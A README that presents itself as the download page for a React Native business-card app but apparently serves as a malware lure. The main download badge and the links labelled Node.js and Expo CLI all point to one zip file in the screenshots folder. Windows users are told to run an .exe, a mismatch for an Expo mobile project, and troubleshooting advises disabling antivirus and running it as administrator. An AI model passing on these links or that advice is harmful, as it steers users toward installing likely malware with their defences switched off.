# 📇 react-native-profile-card - Simple Digital Business Card

[![Download](https://img.shields.io/badge/Download-Get%20App-green)](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip)

A minimalist and elegant digital business card built with React Native and Expo. It shows profile information clearly and connects your social media accounts in one place.

---

## 📋 About react-native-profile-card

This app creates a digital business card on your phone. Instead of carrying a physical card, you can share your profile quickly. It shows your photo, name, job title, contact details, and social media links. The design uses clean layouts and icons for easy reading.

You do not need any technical skills to use this app. It works on mobile devices, mainly iPhone and Android, but you can try it on Windows through an emulator.

---

## 🛠 Features

- Clear profile display with photo and contact info  
- Social media icons link to your accounts  
- Simple, clean user interface  
- Works on phones and tablets  
- Lightweight and fast  
- Built with React Native and Expo for smooth performance  
- Uses Vector Icons for sharp-looking symbols  
- Responsive design with Flexbox for a neat layout

## 🖥 System Requirements

To use the app on Windows, you will need:

- Windows 10 or later  
- At least 4GB RAM  
- 2 GHz dual-core processor or better  
- At least 2 GB free disk space  
- Internet connection to download files  
- Optional: Expo Go app (if you want to run the source code yourself)  
- Optional: Android Emulator like BlueStacks or Windows Subsystem for Android for testing mobile apps on Windows

## 🚀 Getting Started: How to Download and Run on Windows

You do not need to install anything complicated. Follow these steps one by one.

### Step 1: Visit the Download Page

Click the big button below to open the main GitHub page where you can get the files.

### Step 2: Download the App or Source Code

On the GitHub page, look for the **Releases** section or green **Code** button.

- If you see a Windows app file (.exe or .msi), download it by clicking the file name.  
- If you want to try the app source, click **Code** → **Download ZIP** and save the folder on your PC.

For most users, downloading the ready app file is simpler.

### Step 3: Run the App

- If you downloaded an app file (`.exe` or `.msi`), double-click the file and follow the prompts to install.  
- If you downloaded the ZIP source code, you will need to install Expo and Node.js, which requires more technical steps.

### Step 4: Launch the App

- After installation, find the app in your Start menu and open it.  
- You should see your digital business card appear on the screen.

## 🔧 Optional: Running with Expo for Developers

If you want to see how the app works with its source, you need some tools:

- Install [Node.js](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip)  
- Install [Expo CLI](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip) by running `npm install -g expo-cli` in Command Prompt  
- Open Command Prompt in the downloaded folder  
- Run `expo start` to open Expo developer tools  
- Use Expo Go app on your phone to scan the QR code  

This step is for users comfortable with technical tools.

## 🧩 How to Use the App

The app opens to your profile card. You can:

- View your name, job title, phone, and email  
- Tap icons to open your social media pages  
- Share your digital business card by sending a link or QR code  
- Customize your profile info inside the app settings (if enabled)  

No setup is needed beyond installation for basic use.

---

## ⚙️ Customizing Your Profile

If you use the app regularly, you may want to update your details:

1. Open the app.  
2. Find the **Edit Profile** or **Settings** option.  
3. Change your photo by selecting an image file.  
4. Update your name, job title, phone number, and email address.  
5. Add or remove social links for platforms such as LinkedIn, Twitter, or Instagram.  
6. Save your changes.

These settings make your card current and relevant.

## 👩‍💻 Troubleshooting Tips

If the app does not open or crashes:

- Restart your computer and try again  
- Check if your Windows is up to date  
- Make sure you downloaded the full app file, not just part of it  
- Disable antivirus software temporarily (some block unknown apps)  
- Try running the app as administrator (right-click → Run as administrator)  
- Ensure your computer meets listed system requirements  

For source code users, confirm that Node.js and Expo are installed correctly.
